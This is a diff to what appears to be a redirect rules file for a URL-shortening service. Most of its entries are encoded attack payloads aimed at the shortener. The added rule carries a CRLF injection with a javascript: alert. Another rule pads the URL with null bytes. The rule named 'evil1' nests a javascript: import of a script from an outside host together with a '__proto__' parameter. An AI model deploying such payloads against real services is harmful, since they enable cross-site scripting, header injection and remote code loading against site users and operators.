@@ -1,4 +1,5 @@
 ###AUTO-UPDATE###
+/ciallo3 https://s.2x.nz?url=http%3A%2F%2Fexample.com%2F%0D%0Atest%20javascript%3Aalert(%22test%22)%20302 302
 /ciallo2 https://s.2x.nz?url=http%3A%2F%2Fexample.com%2F%00%00%00%00 302
 /ciallo https://s.2x.nz?url=https%3A%2F%2Fcfw-shorter.2x.nz%2F 302
 /evil1 https://s.2x.nz?url=https%3A%2F%2Fs.2x.nz%2F%3Furl%3Djavascript%253Aimport(%2522https%253A%252F%252Fwebstatic.static-resource.182375.xyz%252Finternal%252Fsession%252F92ae4361-c45d-41b1-ae00-e87c6c485725%252Fevil1.js%2522)%26lang%3D__proto__ 302
